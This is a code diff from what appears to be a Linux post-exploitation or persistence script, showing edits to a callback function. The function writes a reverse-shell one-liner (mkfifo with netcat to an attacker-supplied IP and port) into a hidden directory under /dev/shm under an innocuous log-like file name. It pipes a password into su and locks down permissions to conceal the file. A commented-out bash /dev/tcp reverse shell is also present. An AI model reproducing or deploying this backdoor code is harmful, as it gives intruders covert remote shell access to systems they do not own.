@@ -77,15 +77,13 @@ def add_user(username,password):
 def callback(local_ip, local_port, username, password):
 	print("\n### creating callback script for {}:{} ###".format(local_ip,local_port))
 	os.system("mkdir /dev/shm/.data")
-	os.system("touch /dev/shm/.data/data-log.sh")
-	os.system("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f' > /dev/shm/.data/data-log.sh".format(local_ip,local_port))
-	print("\n### enter {}'s password below: ###".format(username))
-	os.system("timeout -k 5 5 passwd {}".format(username))
+	os.system("touch /dev/shm/.data/data_log")
+	os.system("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f' > /dev/shm/.data/data_log".format(local_ip,local_port))
 	os.system("chown {} /dev/shm/.data/".format(username))
-	os.system("echo '{}' | sudo su {}".format(password,username))
-	os.system("chmod 100 /dev/shm/.data/data-log.sh")
+	os.system("echo '{}' | su {}".format(password,username))
+	os.system("chmod 100 /dev/shm/.data/data_log")
 	os.system("chmod 700 /dev/shm/.data/")
-	print("\n### callback placed at /dev/shm/.data/data-log.sh ###")
+	print("\n### callback placed at /dev/shm/.data/data_log ###")
 	#os.system("echo 'bash -i >& /dev/tcp/{}/{} 0>&1' > /dev/shm/.data/data-log.sh".format(local_ip,local_port))
 
 
